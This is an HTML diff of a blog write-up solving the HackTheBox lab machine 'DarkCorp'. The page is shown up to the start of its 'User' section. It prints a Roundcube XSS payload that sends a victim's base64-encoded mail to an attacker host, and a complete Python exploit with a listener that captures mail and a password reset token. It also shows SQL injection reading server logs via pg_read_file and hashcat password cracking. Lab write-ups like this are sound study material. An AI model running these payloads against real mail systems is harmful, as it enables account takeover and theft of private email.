@@ -1,0 +1,967 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.11.0.814136367694">
+
+    <!-- See retype.com -->
+    <meta name="generator" content="Retype 3.11.0">
+
+    <!-- Primary Meta Tags -->
+    <title>DarkCorp (Insane)</title>
+    <meta name="title" content="DarkCorp (Insane)">
+    <meta name="description" content="We start with a quick nmap scan and see that there are only two ports open.">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="https://bytebl33d.github.io/writeups/hackthebox/machines/darkcorp/">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://bytebl33d.github.io/writeups/hackthebox/machines/darkcorp/">
+    <meta property="og:title" content="DarkCorp (Insane)">
+    <meta property="og:description" content="We start with a quick nmap scan and see that there are only two ports open.">
+    <meta property="og:image" content="https://bytebl33d.github.io/assets/images/headers/darkcorp.png">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://bytebl33d.github.io/writeups/hackthebox/machines/darkcorp/">
+    <meta property="twitter:title" content="DarkCorp (Insane)">
+    <meta property="twitter:description" content="We start with a quick nmap scan and see that there are only two ports open.">
+    <meta property="twitter:image" content="https://bytebl33d.github.io/assets/images/headers/darkcorp.png">
+
+    <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
+
+    <link href="../../../../resources/css/retype.css?v=3.11.0.814136367694" rel="stylesheet">
+
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.11.0.814136367694" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.11.0" data-turbo-eval="false" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.11.0.814136367694" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.11.0.814136367694" defer></script>
+</head>
+<body>
+    <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
+        <div class="absolute bottom-0 left-0" style="top: 5rem; right: 50%"></div>
+    
+        <header id="retype-header" class="sticky top-0 z-30 flex w-full h-16 bg-header-bg border-b border-header-border md:h-20">
+            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
+                <!-- Mobile menu button skeleton -->
+                <button v-cloak class="skeleton retype-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
+                <div v-cloak id="retype-sidebar-left-toggle-button"></div>
+        
+                <!-- Logo -->
+                <div class="flex items-center justify-between h-full py-2 md:w-75">
+                    <div class="flex items-center px-2 md:px-6">
+                        <a id="retype-branding-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
+                            <span class="dark:text-white font-bold line-clamp-1 md:line-clamp-2">bytebl33d</span>
+                        </a><span id="retype-branding-label" class="inline-flex mt-1 px-2 py-1 ml-4 text-xs font-medium leading-none items-center rounded-md bg-branding-label-bg text-branding-label-text ring-1 ring-branding-label-border ring-inset md:inline-block">Blog</span>
+                    </div>
+        
+                    <span class="hidden h-8 border-r md:inline-block border-base-border"></span>
+                </div>
+        
+                <div class="flex justify-between md:grow">
+                    <!-- Top Nav -->
+                    <nav id="retype-header-nav" class="hidden md:flex">
+                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="../../../../blog/">Posts</a>
+                            </li>
+                            <li class="mr-6">
+                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/bytebl33d">GitHub</a>
+                            </li>
+        
+                        </ul>
+                    </nav>
+        
+                    <!-- Header Right Skeleton -->
+                    <div v-cloak class="flex justify-end grow skeleton">
+        
+                        <!-- Search input mock -->
+                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
+                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                            </div>
+                            <input class="w-full h-10 placeholder-search-placeholder transition-colors duration-200 ease-in bg-search-bg border border-transparent rounded md:text-sm hover:border-search-border-hover focus:outline-none focus:border-search-border-focus" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
+                        </div>
+        
+                        <!-- Mobile search button -->
+                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
+                        </div>
+        
+                        <!-- Dark mode switch placeholder -->
+                        <div class="w-10 h-10 lg:ml-2"></div>
+        
+                        <!-- History button -->
+                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
+                        </div>
+                    </div>
+        
+                    <div v-cloak class="flex justify-end grow">
+                        <div id="retype-mobile-search-button"></div>
+                        <doc-search-desktop></doc-search-desktop>
+        
+                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
+                        <doc-history></doc-history>
+                    </div>
+                </div>
+            </div>
+        </header>
+    
+    
+        <div id="retype-container" class="container relative flex bg-white">
+            <!-- Sidebar Skeleton -->
+            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-sidebar-left-bg border-sidebar-left-border sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton">
+            
+                <div class="flex items-center h-16 px-6">
+                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-filter-bg border border-filter-border rounded shadow-none text-sm focus:outline-none focus:border-filter-border-focus" type="text" placeholder="Filter">
+                </div>
+            
+                <div class="pl-6 mt-1 mb-4">
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                    <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                </div>
+            
+                <div class="shrink-0 mt-auto bg-transparent dark:border-base-border">
+                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                        <span class="text-xs whitespace-nowrap">Powered by</span>
+                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                    </a>
+                </div>
+            </div>
+            
+            <!-- Sidebar component -->
+            <doc-sidebar v-cloak>
+                <template #sidebar-footer>
+                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-base-border">
+            
+                        <div class="py-3 px-6 md:hidden border-b dark:border-base-border">
+                            <nav>
+                                <ul class="flex flex-wrap justify-center items-center">
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="../../../../blog/">Posts</a>
+                                    </li>
+                                    <li class="mr-6">
+                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-header-text font-header-text-weight hover:text-header-text-hover" href="https://github.com/bytebl33d">GitHub</a>
+                                    </li>
+            
+                                </ul>
+                            </nav>
+                        </div>
+            
+                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-350 dark:text-dark-400 hover:text-gray-600 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
+                            <span class="text-xs whitespace-nowrap">Powered by</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
+                        </a>
+                    </div>
+                </template>
+            </doc-sidebar>
+    
+            <div class="grow min-w-0 bg-body-bg">
+                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
+                <div class="flex">
+                    <div id="retype-main" class="min-w-0 p-4 grow md:px-16">
+                        <main class="relative pb-12 lg:pt-2">
+                            <div class="retype-markdown" id="retype-content">
+                                <!-- Rendered if sidebar right is enabled -->
+                                <div id="retype-sidebar-right-toggle"></div>
+                                <!-- Page content  -->
+<doc-anchor-target id="darkcorp-insane" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#darkcorp-insane">#</doc-anchor-trigger>
+        <span>DarkCorp (Insane)</span>
+    </h1>
+</doc-anchor-target>
+<div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center print:justify-center">
+    <div>In&nbsp;</div>
+    <div><a href="../../../../categories/hackthebox/">HackTheBox</a>,&nbsp;</div>
+    <div><a href="../../../../categories/windows/">Windows</a>,&nbsp;</div>
+    <div><a href="../../../../categories/active-directory/">Active-Directory</a></div>
+    <div class="mx-2">&#9679;</div>
+    <div class="flex items-center shrink-0">Published&nbsp;<span>2025-10-18</span></div>
+</div>
+
+<p><figure class="content-center">
+    <img src="../../../../assets/images/headers/darkcorp.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="synopsis" class="break-words">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#synopsis">#</doc-anchor-trigger>
+        <span>Synopsis</span>
+    </h1>
+</doc-anchor-target>
+<doc-anchor-target id="reconnaissance">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#reconnaissance">#</doc-anchor-trigger>
+        <span>Reconnaissance</span>
+    </h2>
+</doc-anchor-target>
+<p>We start with a quick nmap scan and see that there are only two ports open.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">Nmap scan report for 10.10.11.54
+Host is up (0.035s latency).
+Not shown: 998 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
+| ssh-hostkey: 
+|   256 33:41:ed:0a:a5:1a:86:d0:cc:2a:a6:2b:8d:8d:b2:ad (ECDSA)
+|_  256 04:ad:7e:ba:11:0e:e0:fb:d0:80:d3:24:c2:3e:2c:c5 (ED25519)
+80/tcp open  http    nginx 1.22.1
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.22.1
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+</doc-codeblock></div>
+<p>We also see that this is a linux host although the challenge is Windows (AD) based. Looks like we are in for a treat! Navigating to the website redirects us to <code v-pre>http://drip.htb</code>. After adding this to our <code v-pre>/etc/hosts</code> file we can view the site.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/darkcorp/dripmail-index.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>From the website, we see that the site allows us to sign-up for DripMail, an e-mail solution powered by Roundcube. Roundcube is a browser-based multilingual IMAP client with an application-like user interface. We can create an account using the sign up form.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/darkcorp/dripmail-register.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>When we try to go to the sign-in page, it redirects to <code v-pre>http://mail.drip.htb</code> which we can also add to our hosts file. Once logged in, we receive a welcome e-mail from <code v-pre>no-reply@drip.htb</code>. Next we check the Roundcube version by clicking on the about button at the bottom-left corner.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/darkcorp/dripmail-version.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="foothold">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#foothold">#</doc-anchor-trigger>
+        <span>Foothold</span>
+    </h2>
+</doc-anchor-target>
+<p>When researching for this specific version, we find a blog post from <a href="https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/">Sonar</a> that goes over a critical XSS vulnerability in Roundcube (CVE-2024-42009 and CVE-2024-42008). The blog post talks about improperly sanitized HTLM content. An example of an XSS payload is given by the authors:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-markup"><code v-pre class="language-markup">&lt;body title=&quot;bgcolor=foo&quot; name=&quot;bar style=animation-name:progress-bar-stripes onanimationstart=alert(origin) foo=bar&quot;&gt;
+  Foo
+&lt;/body&gt;</code></pre>
+</doc-codeblock></div>
+<p>This simple email body is enough to execute JavaScript in the victim&#x27;s browser and access their emails. The question is what can we do with this? We can use this vulnerability to send e-mails to unsuspecting users and target a specific URL to read their private e-mails. When hovering over our email we see the following link:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">http://mail.drip.htb/?_task=mail&amp;_mbox=INBOX&amp;_uid=1&amp;_action=show</code></pre>
+</doc-codeblock></div>
+<p>The UID value is the ID of the mail, so by sending the following XSS payload, we can read the contents of the email.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-python"><code v-pre class="language-python">uid = 1
+payload = (
+  f'&lt;body title=&quot;bgcolor=foo&quot; name=&quot;bar style=animation-name:progress-bar-stripes onanimationstart=fetch(\'/?_task=mail&amp;_action=show&amp;_uid={uid}&amp;_mbox=INBOX&amp;_extwin=1\').then(r=&gt;r.text()).then(t=&gt;fetch(`http://10.10.14.11:1337/?c=${btoa(t)}`)) foo=bar&gt;'
+)</code></pre>
+</doc-codeblock></div>
+<p>This will Base64 encode the email contents of the UID specified and send it to our machine. But to who are we sending this payload to? Lets start enumerating further. Back on the main website, we can send a mail to support. We will intercept this request with BurpSuite and see what it does.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/darkcorp/dripmail-support.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>In the request, we see that it hardcodes the recipient.
+<figure class="content-center">
+    <img src="../../../../assets/images/writeups/darkcorp/dripmail-support-mail.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>We can change this to our own and look at the email it sends.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/darkcorp/dripmail-support-bcase.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>The mail is delivered to our inbox and we also find a potential user in the message body. Now that we have a target, we can write our initial exploit.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-python"><code v-pre class="language-python">import threading,argparse,time,requests,base64
+from bs4 import BeautifulSoup
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+parser = argparse.ArgumentParser()
+parser.add_argument(&quot;-m&quot;, &quot;--message&quot;, type=int, dest=&quot;message&quot;, required=True, help=&quot;Message UID&quot;)
+parser.add_argument(&quot;-i&quot;, &quot;--ip&quot;, dest=&quot;ip&quot;, required=True, help=&quot;Attacker IP&quot;)
+parser.add_argument(&quot;-p&quot;, &quot;--port&quot;, type=int, dest=&quot;port&quot;, required=True, help=&quot;Attacker Port&quot;)
+parser.add_argument(&quot;-t&quot;, &quot;--target&quot;, dest=&quot;target&quot;, required=True, help=&quot;Email form to target&quot;)
+args = parser.parse_args()
+
+# config
+LHOST = args.ip
+LPORT = args.port
+TARGET_URL = args.target
+
+payload = (
+    f'&lt;body title=&quot;bgcolor=foo&quot; name=&quot;bar style=animation-name:progress-bar-stripes '
+    f'onanimationstart=fetch(\'/?_task=mail&amp;_action=show&amp;_uid={args.message}&amp;_mbox=INBOX&amp;_extwin=1\')'
+    '.then(r=&gt;r.text()).then(t=&gt;fetch(`http://PLACEHOLDER/c=${btoa(t)}`)) foo=bar&gt;'.replace(&quot;PLACEHOLDER&quot;, f&quot;{LHOST}:{LPORT}&quot;)
+)
+
+post_data = {
+    &quot;name&quot;: &quot;Support&quot;,
+    &quot;email&quot;: &quot;support@drip.com&quot;,
+    &quot;message&quot;: payload,
+    &quot;content&quot;: &quot;html&quot;,
+    &quot;recipient&quot;: &quot;bcase@drip.htb&quot;
+}
+
+class RequestHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        if '/c=' in self.path:
+            encoded = self.path.split('/c=')[1]
+            decoded = base64.b64decode(encoded).decode('utf-8', 'ignore')
+            soup = BeautifulSoup(decoded, 'html.parser')
+            messagebody_div = soup.find('div', id='messagebody')
+            if messagebody_div:
+                print(&quot;\n[+] Captured Email Content:&quot;)
+                print(messagebody_div.decode_contents())
+            else:
+                print(&quot;\n[-] No messagebody div found&quot;)
+        else:
+            print(&quot;[!] Received request but no data found.&quot;)
+
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b'OK')
+    def log_message(self, format, *args):
+        return
+
+def send_mail():
+    response = requests.post(TARGET_URL, data=post_data)
+    print(f&quot;[+] POST request sent! Status Code: {response.status_code}&quot;)
+
+send_mail()
+
+def start_server():
+    server_address = (LHOST, LPORT)
+    httpd = HTTPServer(server_address, RequestHandler)
+    print(f&quot;[*] Listening on port {LPORT}...\n&quot;)
+    httpd.serve_forever()
+
+listener_thread = threading.Thread(target=start_server, daemon=True)
+listener_thread.start()
+
+try:
+    while True: 
+        time.sleep(1)
+except KeyboardInterrupt:
+    print(&quot;\n[!] Stopping...&quot;)</code></pre>
+</doc-codeblock></div>
+<p>This script will send our XSS payload, start a listener on the specified port and send an email to our victim in order to read the message with the specified UID. When this user clicks on the e-mail, it will retrieve the contents. Let&#x27;s run our exploit to target the second message (after the welcome mail).</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ python exploit.py --ip 10.10.14.11 --port 1337 --target http://drip.htb/contact --message 2
+[+] POST request sent! Status Code: 200
+[*] Listening on port 1337...
+
+
+[+] Captured Email Content:
+&lt;div class=&quot;message-part&quot; id=&quot;message-part1&quot;&gt;&lt;div class=&quot;pre&quot;&gt;Hey Bryce,&lt;br/&gt;
+&lt;br/&gt;
+The Analytics dashboard is now live. While it's still in development and limited in functionality, it should provide a good starting point for gathering metadata on the users currently using our service.&lt;br/&gt;
+&lt;br/&gt;
+You can access the dashboard at dev-a3f1-01.drip.htb. Please note that you'll need to reset your password before logging in.&lt;br/&gt;
+&lt;br/&gt;
+If you encounter any issues or have feedback, let me know so I can address them promptly.&lt;br/&gt;
+&lt;br/&gt;
+Thanks&lt;br/&gt;
+&lt;/div&gt;&lt;/div&gt;</code></pre>
+</doc-codeblock></div>
+<p>The message states there is an analytics dashboard live at <code v-pre>dev-a3f1-01.drip.htb</code>. Again, we add it to our hosts file and have a look.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/darkcorp/dev-denied.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>We don&#x27;t have access to go to this page. But since we can read mails of <code v-pre>bcase</code>, we can try to reset their password and quickly read the reset code in order to steal their account.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/darkcorp/dev-reset-pass.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>No we run our exploit again and target the third message:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ python exploit.py --ip 10.10.14.11 --port 1337 --target http://drip.htb/contact --message 3
+[+] POST request sent! Status Code: 200
+[*] Listening on port 1337...
+
+
+[+] Captured Email Content:
+&lt;div class=&quot;message-part&quot; id=&quot;message-part1&quot;&gt;&lt;div class=&quot;pre&quot;&gt;Your reset token has generated. Please reset your password within the next 5 minutes.&lt;br/&gt;
+&lt;br/&gt;
+You may reset your password here: &lt;a href=&quot;http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRyaXAuaHRiIg.Z7HHlA.r7jQLiFSqkwZntB2kJLOMhUOUJ0&quot; rel=&quot;noreferrer&quot; target=&quot;_blank&quot;&gt;http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRyaXAuaHRiIg.Z7HHlA.r7jQLiFSqkwZntB2kJLOMhUOUJ0&lt;/a&gt;&lt;br/&gt;
+&lt;/div&gt;&lt;/div&gt;</code></pre>
+</doc-codeblock></div>
+<p>We can use this link to reset the password and login. Once we are on the dashboard, there is only one functionality that sticks out and that is the search function.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/darkcorp/dev-search.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>A quick test shows it is vulnerable to SQL Injection and it is a Postgresql database.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/darkcorp/dev-sqli.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>We can go ahead and dump the database contents and get the password hashes of all users.
+<figure class="content-center">
+    <img src="../../../../assets/images/writeups/darkcorp/dev-sqli2.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>We discover a new user (<code v-pre>ebelford</code>), but none of the hashes are crackable. We can also try to read files on the server using the <code v-pre>pg_read_file</code> system function of Postgres.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/darkcorp/dev-sqli3.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>We just need to figure out some interesting files to read. Postgresql 15 usually stores its log files at <code v-pre>/var/log/postgresql/postgresql-15-main.log</code>. While this log had nothing interesting in it, I started looking at the old log file instead and found some interesting stuff.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">'';SELECT pg_read_file('/var/log/postgresql/postgresql-15-main.log.1', 0, 100000);</code></pre>
+</doc-codeblock></div>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/darkcorp/dev-sqli4.png" alt="" class="rounded-image-rounded border-image-border border-image-border-width" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>The old logs contain a password hash for <code v-pre>ebelford</code> that we are able to crack.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ hashcat -m 0 8bbd7f88841b4223ae63c8848969be86 $ROCKYOU
+8bbd7f88841b4223ae63c8848969be86:ThePlague61780
+
+$ ssh ebelford@drip.htb
+ebelford@drip.htb's password:ThePlague61780
+ebelford@drip:~$ </code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="user">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#user">#</doc-anchor-trigger>
+        <span>User</span>
+    </h2>
+</doc-anchor-target>
+<p>After connecting via SSH, we can look for intersting files in the <code v-pre>/var/www</code> directory. The below script will search for some common configuration files with interesting keywords:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
